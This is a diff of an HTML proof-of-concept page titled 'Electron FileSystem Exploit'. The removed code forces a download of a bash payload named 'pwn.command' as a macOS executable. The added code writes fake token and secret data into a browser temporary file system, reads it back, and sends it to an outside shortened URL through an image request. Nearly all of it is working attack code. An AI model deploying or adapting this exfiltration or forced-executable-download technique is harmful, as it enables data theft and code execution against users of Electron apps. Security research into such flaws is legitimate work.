@@ -1,18 +1,45 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Electron FileSystem Exploit</title>
+</head>
 <body>
+  <h1>Testing webkitRequestFileSystem</h1>
   <script>
-    const payload = `#!/bin/bash
-open -a Calculator
-`;
-    const blob = new Blob([payload], { type: "text/plain" });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "pwn.command";  // macOS executable
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+    const EXFIL_URL = 'https://tinyurl.com/yz885dsu/leak';
+
+    // Request temporary file system
+    webkitRequestFileSystem(TEMPORARY, 1024 * 1024, function(fs) {
+      // Create a file
+      fs.root.getFile('exploit.txt', { create: true }, function(fileEntry) {
+        // Create writer and write to file
+        fileEntry.createWriter(function(writer) {
+          const content = "stolen_token=abc123;secret=leaked!";
+          const blob = new Blob([content], { type: 'text/plain' });
+          
+          writer.write(blob);
+
+          // After write is done, read back the file
+          writer.onwriteend = function() {
+            fileEntry.file(function(file) {
+              const reader = new FileReader();
+              reader.onloadend = function() {
+                // Exfiltrate file content
+                const leak = new Image();
+                leak.src = EXFIL_URL + '?data=' + encodeURIComponent(reader.result);
+              };
+              reader.readAsText(file);
+            });
+          };
+        }, function(err) {
+          console.error('CreateWriter error:', err);
+        });
+      }, function(err) {
+        console.error('GetFile error:', err);
+      });
+    }, function(err) {
+      console.error('RequestFileSystem error:', err);
+    });
   </script>
 </body>
 </html>
